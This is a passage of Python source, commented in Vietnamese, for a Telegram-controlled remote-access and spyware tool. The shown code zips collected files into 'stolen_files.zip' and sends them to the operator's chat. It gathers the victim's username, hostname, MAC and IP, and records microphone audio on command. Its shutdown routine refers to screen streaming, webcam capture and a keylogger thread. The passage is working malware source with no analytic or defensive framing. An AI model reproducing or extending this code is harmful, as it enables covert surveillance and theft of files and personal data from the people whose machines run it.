            f"📦 Đang nén {copied_files} file...\n"
            f"Vui lòng đợi trong giây lát."
        )
        
        # Nén file với giới hạn kích thước chunk
        zip_path = os.path.join(TEMP_DIR, "stolen_files.zip")
        chunk_size = 64 * 1024  # 64KB chunks
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zipf.write(file_path, arcname)
        
        # Gửi file với timeout cao hơn
        with open(zip_path, 'rb') as doc:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=doc,
                caption=f"📦 Đã thu thập được {copied_files} file\n"
                        f"(Đã bỏ qua {skipped_files} file quá lớn)",
                read_timeout=300,
                write_timeout=300,
                connect_timeout=300,
                pool_timeout=300
            )
            
        # Dọn dẹp
        try:
            shutil.rmtree(temp_dir)
            os.remove(zip_path)
        except:
            pass
            
        await status_message.edit_text("✅ Đã hoàn thành thu thập file!")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {str(e)}")
        # Dọn dẹp trong trường hợp lỗi
        try:
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)
            if os.path.exists(zip_path):
                os.remove(zip_path)
        except:
            pass

@require_auth
async def system_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command để lấy thông tin hệ thống"""
    try:
        import socket
        
        # Lấy hostname và IP
        hostname = socket.gethostname()  # Tên máy tính trong mạng
        local_ip = socket.gethostbyname(hostname)  # IP của máy tính
        
        # Thu thập thông tin với giải thích tiếng Việt
        info = {
            "PC Name": PC_NAME,          # Tên máy tính trong Windows
            "Username": getpass.getuser(),       # Tên người dùng đang đăng nhập
            "Hostname": hostname,                # Tên định danh máy tính trong mạng
            "OS": platform.system() + " " + platform.release(),  # Hệ điều hành
            "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                          for elements in range(0,8*6,8)][::-1]),  # Địa chỉ MAC
            "Local IP": local_ip,               # Địa chỉ IP trong mạng nội bộ
        }
        
        # Tạo message
        message = "*💻 Thông tin hệ thống*\n\n"
        for key, value in info.items():
            message += f"*{key}:* `{value}`\n"
            
        await update.message.reply_text(
            message,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {str(e)}")

# Thêm biến để kiểm soát ghi âm
is_recording_audio = False
audio_task = None

# Thêm hàm điều khiển ghi âm
@require_auth
async def record_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("🎙️ Bắt đầu ghi", callback_data="start_recording_audio"),
            InlineKeyboardButton("⏹️ Dừng ghi", callback_data="stop_recording_audio")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🎙️ Điều khiển ghi âm:\n"
        "• Bắt đầu ghi: Ghi âm trong 30 giây\n"
        "• Dừng ghi: Dừng ghi âm ngay lập tức",
        reply_markup=reply_markup
    )

# Thêm hàm xử lý các nút điều khiển ghi âm
async def handle_audio_recording(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_recording_audio, audio_task
    query = update.callback_query
    await query.answer()
    
    try:
        if query.data == "start_recording_audio":
            if is_recording_audio:
                await query.answer("Đang ghi âm!", show_alert=True)
                return

            # Bắt đầu ghi âm
            async def record_audio():
                global is_recording_audio
                try:
                    # Cấu hình ghi âm
                    duration = 30  # Thời gian ghi âm (giây)
                    fs = 44100    # Tần số lấy mẫu
                    channels = 2   # Số kênh (stereo)
                    
                    # Bắt đầu ghi
                    is_recording_audio = True
                    await query.edit_message_text("🎙️ Đang ghi âm... (30 giây)")
                    
                    # Ghi âm
                    recording = sd.rec(int(duration * fs), samplerate=fs, channels=channels)
                    sd.wait()
                    
                    if not is_recording_audio:  # Kiểm tra nếu đã dừng giữa chừng
                        return
                        
                    # Chuyển recording thành bytes
                    audio_buffer = BytesIO()
                    wavio.write(audio_buffer, recording, fs, sampwidth=3)
                    audio_buffer.seek(0)
                    
                    await context.bot.send_audio(
                        chat_id=query.message.chat_id,
                        audio=audio_buffer,
                        caption="🎵 File ghi âm",
                        title=f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
                    )
                    
                    is_recording_audio = False
                    await query.edit_message_text("✅ Đã hoàn thành ghi âm!")
                    
                except Exception as e:
                    is_recording_audio = False
                    await context.bot.send_message(
                        chat_id=query.message.chat_id,
                        text=f"❌ Lỗi khi ghi âm: {str(e)}"
                    )

            audio_task = asyncio.create_task(record_audio())
            await query.answer("Đang bắt đầu ghi âm...", show_alert=True)

        elif query.data == "stop_recording_audio":
            if not is_recording_audio:
                await query.answer("Không có phiên ghi âm nào đang chạy!", show_alert=True)
                return
                
            is_recording_audio = False
            if audio_task:
                try:
                    audio_task.cancel()
                except:
                    pass
                audio_task = None
            await query.edit_message_text("⏹️ Đã dừng ghi âm")

    except Exception as e:
        await query.edit_message_text(f"❌ Lỗi: {str(e)}")

# Thêm hàm xử lý tin nhắn thường
async def graceful_shutdown(application):
    """Xử lý việc tắt bot một cách an toàn và dọn dẹp tài nguyên"""
    print("📤 Đang tắt bot an toàn...")
    
    try:
        # 1. Dừng các tác vụ đang chạy
        await stop_running_tasks()
        
        # 2. Dừng các thành phần của bot
        await stop_telegram_components(application)
        
        # 3. Dọn dẹp file tạm và file lock
        cleanup_temporary_files()
        
        print("✅ Bot đã dừng thành công!")
    except Exception as e:
        print(f"❌ Lỗi trong quá trình tắt: {e}")

async def stop_running_tasks():
    """Dừng các tác vụ đang chạy"""
    global is_streaming, is_recording, is_logging, is_recording_audio
    
    # Đặt các biến kiểm soát về False để dừng các vòng lặp
    is_streaming = False
    is_recording = False
    is_logging = False
    is_recording_audio = False
    
    # Dừng các task bất đồng bộ
    for task_name, task in [
        ('stream_task', stream_task), 
        ('webcam_task', webcam_task), 
        ('audio_task', audio_task)
    ]:
        if task_name in globals() and task:
            try:
                task.cancel()
                print(f"✓ Đã dừng {task_name}")
            except Exception as e:
                print(f"✗ Lỗi khi dừng {task_name}: {e}")
    
    # Dừng keylogger thread
    if 'log_thread' in globals() and log_thread and log_thread.is_alive():
        try:
            # Join với timeout để tránh treo ứng dụng
            log_thread.join(timeout=1)
            print("✓ Đã dừng keylogger thread")
        except Exception as e:
            print(f"✗ Lỗi khi dừng keylogger thread: {e}")
    
    # Cho phép thời gian để các task dừng
    await asyncio.sleep(0.5)

async def stop_telegram_components(application):
    """Dừng các thành phần Telegram"""
    # Dừng updater trước nếu đang chạy
    if hasattr(application, 'updater') and application.updater and application.updater.running:
        try:
            await application.updater.stop()
            print("✓ Đã dừng updater")
        except Exception as e:
            print(f"✗ Lỗi khi dừng updater: {e}")
    
    # Dừng application
    if hasattr(application, 'running') and application.running:
        try:
            await application.stop()
            print("✓ Đã dừng application")
        except Exception as e:
            print(f"✗ Lỗi khi dừng application: {e}")

def cleanup_temporary_files():
    """Dọn dẹp các file tạm và file lock"""
    # Xóa các file tạm
    try:
        temp_files = ['temp_video.mp4']
        for file in temp_files:
            if os.path.exists(file):
                os.remove(file)
                print(f"✓ Đã xóa file tạm {file}")
    except Exception as e:
        print(f"✗ Lỗi khi xóa file tạm: {e}")
    
    # Xóa file lock
    try:
        lock_file = os.path.join(tempfile.gettempdir(), 'telegram_bot.lock')
        if os.path.exists(lock_file):
            os.remove(lock_file)
            print("✓ Đã xóa file lock")
    except Exception as e:
        print(f"✗ Lỗi khi xóa file lock: {e}")

def prepare_environment():
    """Chuẩn bị môi trường trước khi khởi động"""
    # Tạo thư mục lưu trữ bot_data nếu chưa tồn tại
    bot_data_dir = os.path.dirname(os.path.abspath(__file__))
    os.makedirs(bot_data_dir, exist_ok=True)
    
    # Xử lý file lock cũ
    handle_stale_lock_file()

def handle_stale_lock_file():
    """Xử lý file lock cũ từ các phiên trước bị crash"""
    lock_file = os.path.join(tempfile.gettempdir(), 'telegram_bot.lock')
    
    if os.path.exists(lock_file):
        try:
            with open(lock_file, 'r') as f:
                content = f.read().strip()
                
            # Kiểm tra định dạng của file lock
            if ',' in content:
                parts = content.split(',')
                timestamp = parts[1]
                
                # Kiểm tra xem file lock có cũ hơn 30 phút không
                lock_time = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                if (datetime.now() - lock_time).total_seconds() > 1800:  # 30 phút
                    os.remove(lock_file)
                    print("✅ Đã xóa file lock cũ (>30 phút)")
        except Exception:
            # Nếu có lỗi khi đọc hoặc xử lý file, xóa nó
            os.remove(lock_file)
            print("✅ Đã xóa file lock không hợp lệ")

def cleanup_lock_file():
    """Dọn dẹp file lock khi thoát ứng dụng"""
    try:
        lock_file = os.path.join(tempfile.gettempdir(), 'telegram_bot.lock')
        if os.path.exists(lock_file):
            os.remove(lock_file)
    except Exception:
        pass

if __name__ == "__main__":
    """Điểm khởi động chính của ứng dụng"""
    try:
        # Đặt biến môi trường để tắt các cảnh báo không cần thiết
        os.environ['PYTHONWARNINGS'] = 'ignore:Unverified HTTPS request'
        
        # Chuẩn bị thư mục và môi trường
        prepare_environment()
        
        # Khởi động main loop với asyncio
        asyncio.run(main())
        
    except KeyboardInterrupt:
        print("\n👋 Kết thúc ứng dụng theo yêu cầu người dùng")
    except asyncio.CancelledError:
        print("\n🛑 Ứng dụng đã bị hủy bỏ")
    except SystemExit:
        # Đã xử lý trong main()
        pass
    except Exception as e:
        print(f"\n❌ Lỗi nghiêm trọng: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Đảm bảo file lock được xóa trong mọi trường hợp
        cleanup_lock_file()
        print("👋 Đã thoát ứng dụng")
